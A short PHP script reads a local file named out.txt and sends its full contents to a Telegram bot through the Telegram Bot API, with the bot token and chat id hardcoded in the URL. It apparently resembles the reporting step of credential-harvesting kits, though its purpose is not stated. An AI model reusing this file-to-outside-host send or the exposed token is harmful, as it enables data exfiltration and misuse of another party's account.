<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1266756643:AAFKy06v3rK4aaXXvnOfTC4Pa7Byk90KGeA/sendMessage?chat_id=979032880&text=$msg");
?>
